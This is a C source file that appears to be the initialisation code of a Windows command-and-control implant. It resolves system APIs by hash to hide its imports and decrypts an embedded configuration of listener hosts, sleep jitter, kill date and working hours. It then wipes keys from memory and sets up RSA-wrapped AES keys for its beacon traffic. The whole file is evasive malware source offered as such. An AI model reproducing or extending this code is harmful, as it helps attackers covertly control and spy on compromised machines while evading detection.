#include "../../headers/Crypt/wolfssl/wolfcrypt/rsa.h"
#include "../../headers/Crypt/wolfssl/wolfcrypt/random.h"
#include "../../headers/agent/agent.h"
#include "../../headers/cstdreplacement/localcstd.h"
#include "../../headers/helpers/parser.h"
#include "../../headers/helpers/ListManager.h"
#include "../../headers/agent/evasion/PeParsing/evasive.h"

#ifdef CONFIG_BYTES
BYTE AgentConfigBytes[] = CONFIG_BYTES;
#endif
#ifdef CONFIG_IV_BYTES
BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
#endif
#ifdef CONFIG_KEY_BYTES
BYTE ConfigKeyBytes[] = CONFIG_KEY_BYTES;
#endif

#ifdef HASH_CONFIG_BYTES
BYTE HashConfigBytes[] = HASH_CONFIG_BYTES;
#endif
#ifdef HASH_IV_BYTES
BYTE HashIVBytes[] = HASH_IV_BYTES;
#endif
#ifdef HASH_KEY_BYTES
BYTE HashKeyBytes[] = HASH_KEY_BYTES;
#endif

UINT64 DllHashes[2] = { 0 };
UINT64 ApiHashes[50] = { 0 };

INT init_agent() {


#ifdef _WIN64
    agent->pTeb = (void*)__readgsqword(0x30);
#else
    agent->pTeb = (void*)__readfsdword(0x18);
#endif

    printhashes();  // after we've received the function pointers we can print the hashes of the function names. TODO remove for production only needed while developing.

    if (!ParseHashConfig()) {
        return -1;
    }


    //obtain winhttp apis
    //NEEDS TO be resolved using a hash of the function name.
    agent->apis->pWinHttpOpen = (t_WinHttpOpen)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[0]);
    if (!agent->apis->pWinHttpOpen) {
        return -1;
    }
    agent->apis->pWinHttpConnect = (t_WinHttpConnect)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[1]);
    if (!agent->apis->pWinHttpConnect) {
        return -1;
    }
    agent->apis->pWinHttpOpenRequest = (t_WinHttpOpenRequest)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[2]);
    if (!agent->apis->pWinHttpOpenRequest) {
        return -1;
    }
    agent->apis->pWinHttpSendRequest = (t_WinHttpSendRequest)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[3]);
    if (!agent->apis->pWinHttpSendRequest) {
        return -1;
    }
    agent->apis->pWinHttpSetOption = (t_WinHttpSetOption)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[4]);
    if (!agent->apis->pWinHttpSetOption) {
        return -1;
    }
    agent->apis->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[5]);
    if (agent->apis->pWinHttpAddRequestHeaders == NULL) {
        return -1;
    }
    agent->apis->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[6]);
    if (!agent->apis->pWinHttpReceiveResponse) {
        return -1;
    }
    agent->apis->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[7]);
    if (!agent->apis->pWinHttpQueryHeaders) {
        return -1;
    }
    agent->apis->pWinHttpReadData = (t_WinHttpReadData)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[8]);
    if (!agent->apis->pWinHttpReadData) {
        return -1;
    }
    agent->apis->pWinHttpCloseHandle = (t_WinHttpCloseHandle)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[9]);
    if (!agent->apis->pWinHttpCloseHandle) {
        return -1;
    }

    //obtain ntdll apis
    agent->apis->pRtlGetVersion = (t_RtlGetVersion)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[10]);
    if (!agent->apis->pRtlGetVersion) {
        return -1;
    }
    agent->apis->pNtClose = (t_NtClose)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[11]);
    if (!agent->apis->pNtClose) {
        return -1;
    }
    agent->apis->pNtOpenProcessToken = (t_NtOpenProcessToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[12]);
    if (!agent->apis->pNtOpenProcessToken) {
        return -1;
    }
    agent->apis->pNtOpenThreadToken = (t_NtOpenThreadToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[13]);
    if (!agent->apis->pNtOpenThreadToken) {
        return -1;
    }
    agent->apis->pNtQueryInformationToken = (t_NtQueryInformationToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[14]);
    if (!agent->apis->pNtQueryInformationToken) {
        return -1;
    }
    agent->apis->pRtlAllocateHeap = (t_RtlAllocateHeap)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[15]);
    if (!agent->apis->pRtlAllocateHeap) {
        return -1;
    }
    agent->apis->pRtlReAllocateHeap = (t_RtlReAllocateHeap)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[16]);
    if (!agent->apis->pRtlReAllocateHeap) {
        return -1;
    }
    agent->apis->pRtlRandomEx = (t_RtlRandomEx)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[17]);
    if (!agent->apis->pRtlRandomEx) {
        return -1;
    }
    agent->apis->pNtGetTickCount = (t_NtGetTickCount)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[18]);
    if (!agent->apis->pNtGetTickCount) {
        return -1;
    }
    agent->apis->pRtlCreateTimerQueue = (t_RtlCreateTimerQueue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[30]);
    if (!agent->apis->pRtlCreateTimerQueue) {
        return -1;
    }
    agent->apis->pNtCreateEvent = (t_NtCreateEvent)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[31]);
    if (!agent->apis->pNtCreateEvent) {
        return -1;
    }

    agent->apis->pRtlCaptureContext = (t_RtlCaptureContext)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[32]);
    if (!agent->apis->pRtlCaptureContext)
        return -1;

    agent->apis->pRtlCreateTimer = (t_RtlCreateTimer)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[33]);
    if (!agent->apis->pRtlCreateTimer)
        return -1;

    agent->apis->pRtlRegisterWait = (t_RtlRegisterWait)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[34]);
    if (!agent->apis->pRtlRegisterWait)
        return -1;

    agent->apis->pRtlDeleteTimerQueue = (t_RtlDeleteTimerQueue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[35]);
    if (!agent->apis->pRtlDeleteTimerQueue)
        return -1;

    agent->apis->pRtlCopyMappedMemory = (t_RtlCopyMappedMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[36]);
    if (!agent->apis->pRtlCopyMappedMemory)
        return -1;

    agent->apis->pNtWaitForSingleObject = (t_NtWaitForSingleObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[37]);
    if (!agent->apis->pNtWaitForSingleObject)
        return -1;

    agent->apis->pNtSignalAndWaitForSingleObject = (t_NtSignalAndWaitForSingleObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[38]);
    if (!agent->apis->pNtSignalAndWaitForSingleObject)
        return -1;

    agent->apis->pNtContinue = (t_NtContinue)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[39]);
    if (!agent->apis->pNtContinue)
        return -1;

    agent->apis->pNtSetEvent = (t_NtSetEvent)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[40]);
    if (!agent->apis->pNtSetEvent)
        return -1;

    agent->apis->pNtSetContextThread = (t_NtSetContextThread)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[41]);
    if (!agent->apis->pNtSetContextThread)
        return -1;

    agent->apis->pNtDuplicateObject = (t_NtDuplicateObject)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[42]);
    if (!agent->apis->pNtDuplicateObject)
        return -1;

    agent->apis->pLdrGetProcedureAddress = (t_LdrGetProcedureAddress)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[46]);
    if (!agent->apis->pLdrGetProcedureAddress)
        return -1;
    
    agent->apis->pNtQueryVirtualMemory = (t_NtQueryVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[47]);
    if (!agent->apis->pNtQueryVirtualMemory)
        return -1;


    //obtain iphlpapi apis
    agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)RetrieveFunctionPointerFromhash(agent->apis->hIphlpapi, ApiHashes[19]);
    if (!agent->apis->pGetAdaptersInfo) {
        return -1;
    }


    //obtain advapi32 apis
    agent->apis->pGetUserNameA = (t_GetUserNameA)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[20]);
    if (!agent->apis->pGetUserNameA) {
        return -1;
    }
    agent->apis->pSystemFunction032 = (t_SystemFunction032)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[44]);
    if (!agent->apis->pSystemFunction032)
        return -1;

    //obtain kernel32 apis
    agent->apis->pGetComputerNameExA = (t_GetComputerNameExA)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[21]);
    if (!agent->apis->pGetComputerNameExA) {
        return -1;
    }

	agent->apis->pLocalReAlloc = (t_LocalReAlloc)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[23]);
	if (!agent->apis->pLocalReAlloc) {
		return -1;
	}

    agent->apis->pGetLocalTime = (t_GetLocalTime)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[27]);
    if (!agent->apis->pGetLocalTime) {
        return -1;
    }
    agent->apis->pGetSystemTimeAsFileTime = (t_GetSystemTimeAsFileTime)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[28]);
	if (!agent->apis->pGetSystemTimeAsFileTime) {
		return -1;
	}
    agent->apis->pVirtualProtect = (t_VirtualProtect)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[43]);
    if (!agent->apis->pVirtualProtect)
        return -1;
    
    agent->apis->pWaitForSingleObjectEx = (t_WaitForSingleObjectEx)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[45]);
    if (!agent->apis->pWaitForSingleObjectEx)
        return -1;

    //obtain user32 apis
    agent->apis->pGetSystemMetrics = (t_GetSystemMetrics)RetrieveFunctionPointerFromhash(agent->apis->hUser32, ApiHashes[29]);
    if(!agent->apis->pGetSystemMetrics){
        return -1;
    }
    CopyMemory(agent->apis->BaseThreadInitThunkHash, ApiHashes[48], sizeof(UINT64));
    CopyMemory(agent->apis->RtlUserThreadStartHash, ApiHashes[49], sizeof(UINT64));

	RtlSecureZeroMemory(ApiHashes, sizeof(ApiHashes));
	RtlSecureZeroMemory(DllHashes, sizeof(DllHashes));

    agent->Context = (PContextInfo)agent->apis->pLocalAlloc(LPTR, sizeof(ContextInfo));
    if (!agent->Context) {
        printf("[error] attempting to allocate memory for context\n");
        return -1;
    }

	agent->session = (pHttpSession)agent->apis->pLocalAlloc(LPTR, sizeof(HttpSession));
	if (!agent->session) {
		printf("[error] attempting to allocate memory for session\n");
		return -1;
	}


#if _WIN64
    agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    agent->Context->Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if (ProcessIsWow(NtCurrentProcess())) {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    }
    else {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    //read rsa public key in der format from file.
    RsaKey rsaPublicKey;
    word32 idx = 0;
    WC_RNG rng;
    byte* EncryptedAesKey = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* EncryptedIV = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* AesKey = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * AES_256_KEY_SIZE));
    byte* AesIV = (byte*)agent->apis->pLocalAlloc(LPTR, (sizeof(byte) * AES_BLOCK_SIZE));

    
    ParseConfig();

    wc_InitRsaKey(&rsaPublicKey, NULL);
    wc_RsaPublicKeyDecode(agent->config->RSAPubKey, &idx, &rsaPublicKey, agent->config->RSAPubKeySize);

    //generate rng object
    wc_InitRng(&rng);

    //generate aeskey and iv
    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);

    //encrypt aes key
    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
    if (EncryptedKeySize == 0 ){
		return -1;
	}

    //encrypt iv
    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
    if(EncryptedIvSize == 0 ){ 
        return -1;
    }

    wc_FreeRng(&rng);

    agent->config->AgentID = 0xdeadbeef;
    agent->AESKey = AesKey;
    agent->AESKeySize = AES_256_KEY_SIZE;
    agent->EncryptedAESKey = EncryptedAesKey;
    agent->EncryptedAESKeySize = EncryptedKeySize;
    agent->IV = AesIV;
    agent->IVSize = AES_BLOCK_SIZE;
    agent->EncryptedIV = EncryptedIV;
    agent->EncryptedIVSize = EncryptedIvSize;

    agent->ModuleBaseAddr = GetModuleBaseAddr(0);
    agent->ImageSize = GetImageSize(agent->ModuleBaseAddr);
    agent->NumSections = GetNumberOfSections(agent->ModuleBaseAddr);

    return 0;
}

//FINISH PARSING CONFIG DATA.
INT ParseConfig() {

    PARSER parser = { 0 };
    INT NumHosts = 0;
    INT NumHeaders = 0;
    PWCHAR Addr = NULL;
	LPWSTR BufferW = NULL;
    LPSTR BufferA = NULL;
    INT Port = 0;
    INT Length = 0;

    NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));

	MemorySet(AgentConfigBytes,0, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.

	ParserDecrypt(&parser, ConfigKeyBytes, ConfigIVBytes);
    MemorySet(ConfigKeyBytes,0, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
    MemorySet(ConfigIVBytes,0, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.

	agent->config = (PAgentConfig)agent->apis->pLocalAlloc(LPTR, sizeof(AgentConfig));
    if (!agent->config) {
        return -1;
    }
	agent->config->listenerConfig = (pListenerConfig)agent->apis->pLocalAlloc(LPTR, sizeof(ListenerConfig));
	if (!agent->config->listenerConfig) {
		return -1;
	}
	agent->config->listenerConfig->Hosts = (pHostData)agent->apis->pLocalAlloc(LPTR, sizeof(HostData));
	if (!agent->config->listenerConfig->Hosts) {
		return -1;
	}
	agent->config->listenerConfig->CurrentHost = (pHostData)agent->apis->pLocalAlloc(LPTR, sizeof(HostData));
    if (!agent->config->listenerConfig->CurrentHost) {
        return -1;
    }

    //read sleep and jitter times.
	agent->config->SleepTime = ParserReadInt32(&parser);
	agent->config->SleepJitter = ParserReadInt32(&parser);
    
    //read the agent name for decrypting agent payloads using the correct private key file.
    BufferA = ParserReadString(&parser, &Length);
	agent->config->AgentName = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(CHAR));
	MemoryCopy(agent->config->AgentName, BufferA, Length);

    //read operation times.
	agent->config->KillDate = ParserReadInt64(&parser);
	agent->config->WorkingHours = ParserReadInt32(&parser);
    
    //read methodology of contacting the litening server.
    BufferW = ParserReadWString(&parser, &Length);
	agent->config->listenerConfig->Method = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
	MemoryCopy(agent->config->listenerConfig->Method, BufferW, Length);
    
    //read the way we rotate potential listening servers.
    agent->config->listenerConfig->HostRotation = ParserReadInt32(&parser);
    
    NumHosts = ParserReadInt32(&parser);
    for (int i = 0; i < NumHosts; i++) {
        Addr = ParserReadWString(&parser, &Length);
        Port = ParserReadInt32(&parser);
        if (Length > 0) {
            AddHost(Addr, Length, Port);
        }
    }
	agent->config->listenerConfig->NumHosts = NumHosts;
	agent->config->listenerConfig->CurrentHost = SelectHost(agent->config->listenerConfig->HostRotation);

	agent->config->listenerConfig->Secure = ParserReadInt32(&parser);
    BufferW = ParserReadWString(&parser, &Length);
    agent->config->listenerConfig->UserAgent = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
	MemoryCopy(agent->config->listenerConfig->UserAgent, BufferW, Length);

	NumHeaders = ParserReadInt32(&parser);
	agent->config->listenerConfig->Headers = agent->apis->pRtlAllocateHeap(
        NtProcessHeap(agent), HEAP_ZERO_MEMORY, sizeof(LPWSTR) * ( ( NumHeaders + 1 ) * 2) 
    );
    for (int i = 0; i < NumHeaders; i++) {
        BufferW = ParserReadWString(&parser, &Length);
		agent->config->listenerConfig->Headers[i] = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
		MemorySet(agent->config->listenerConfig->Headers[i], 0, Length + sizeof(WCHAR));
		MemoryCopy(agent->config->listenerConfig->Headers[i], BufferW, Length);
    }
    agent->config->listenerConfig->Headers[NumHeaders+1] = NULL;

	BufferW = ParserReadBytes(&parser, &Length);
	agent->config->RSAPubKey = agent->apis->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length);
	MemoryCopy(agent->config->RSAPubKey, BufferW, Length);
	agent->config->RSAPubKeySize = Length;

    return 0;
}


BOOL ParseHashConfig() {
    AESCTR(HashConfigBytes, sizeof(HashConfigBytes), HashKeyBytes, sizeof(HashKeyBytes), HashIVBytes);
    for (int i = 0; i < sizeof(DllHashes)/sizeof(UINT64); i++) {
        MemoryCopy(&DllHashes[i], HashConfigBytes + (i * sizeof(UINT64)), sizeof(UINT64));
    }
    for (int i = 0; i < sizeof(ApiHashes) / sizeof(UINT64); i++) {
        MemoryCopy(&ApiHashes[i], HashConfigBytes + ((i + 2) * sizeof(UINT64)), sizeof(UINT64));
    }
    HMODULE k32 = RetrieveModuleHandleFromHash(DllHashes[0]);
    if (k32 == INVALID_HANDLE_VALUE)
    {
        printf("[error] attempting to retrieve kernel32 module handle\n");
        return -1;
    }
    HMODULE ntdll = RetrieveModuleHandleFromHash(DllHashes[1]);
    if (ntdll == INVALID_HANDLE_VALUE) {
        printf("[error] attempting to retrieve ntdll module handle\n");
        return -1;
    }

    t_LocalAlloc pLocalAlloc = RetrieveFunctionPointerFromhash(k32, ApiHashes[22]);
    if (pLocalAlloc == NULL) {
        printf("[error] attempting to retrieve LocalAlloc function pointer\n");
        return -1;
    }

    INT ERR;
    agent->apis = (pWin32)pLocalAlloc(LPTR, sizeof(Win32));
    if (!agent->apis) {
        printf("[error] attempting to allocate memory for win32 apis\n");
        return -1;
    }
    agent->apis->pLocalAlloc = pLocalAlloc;
    agent->apis->hKernel32 = k32;
    agent->apis->hNtdll = ntdll;
    agent->apis->pLoadLibraryA = (t_LoadLibraryA)RetrieveFunctionPointerFromhash(k32, ApiHashes[25]);
    agent->apis->pLocalFree = (t_LocalFree)RetrieveFunctionPointerFromhash(k32, ApiHashes[24]);
	agent->apis->pGetProcAddress = (t_GetProcAddress)RetrieveFunctionPointerFromhash(k32, ApiHashes[26]);


    UINT Length = 0;
    UINT TotalLength = sizeof(DllHashes) + sizeof(ApiHashes); // have index point to end of hashes in config.
   
    for (int i = 0; i < 6; i++)
    {
        MemoryCopy(&Length, HashConfigBytes + TotalLength, sizeof(UINT)); // obtain length of the string we're extracting out
        LPSTR Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length); // create buffer size the length of the string.
        TotalLength += sizeof(UINT); // add size of length parameter to index
        MemoryCopy(Buffer, HashConfigBytes + TotalLength, Length); // copy out our string.

        switch (i)
        {
            case 0:
                agent->apis->hAdvapi32 = agent->apis->pLoadLibraryA(Buffer); // load our library.
                if (agent->apis->hAdvapi32 == NULL) {
                    return -1;
                }
                break;

            case 1:
                agent->apis->hWinHttp = agent->apis->pLoadLibraryA(Buffer);
                if (agent->apis->hWinHttp == NULL) {
                    return -1;
                }
                break;
            case 2:
                agent->apis->hUser32 = agent->apis->pLoadLibraryA(Buffer);
                if (agent->apis->hUser32 == NULL) {
                    return -1;
                }
                break;
            case 3:
                agent->apis->hIphlpapi = agent->apis->pLoadLibraryA(Buffer);
                if (agent->apis->hIphlpapi == NULL) {
                    return -1;
                }
                break;
            case 4:
                agent->apis->hCryptSp = agent->apis->pLoadLibraryA(Buffer);
                if (agent->apis->hCryptSp == NULL) {
                    return -1;
                }
                break;
            case 5:
                agent->apis->hKernelBase = agent->apis->pLoadLibraryA(Buffer);
                if(agent->apis->hKernelBase == NULL) {
                    return -1;
                }
                break;

            default:
                break;
        }
       
        TotalLength += Length; // add our string length to our index.
        RtlSecureZeroMemory(Buffer, Length); // clear our string.
        agent->apis->pLocalFree(Buffer); // free our string buffer. 
    }


    RtlSecureZeroMemory(HashConfigBytes, sizeof(HashConfigBytes));
    RtlSecureZeroMemory(HashKeyBytes, sizeof(HashKeyBytes));
    RtlSecureZeroMemory(HashIVBytes, sizeof(HashIVBytes));

    return TRUE;
}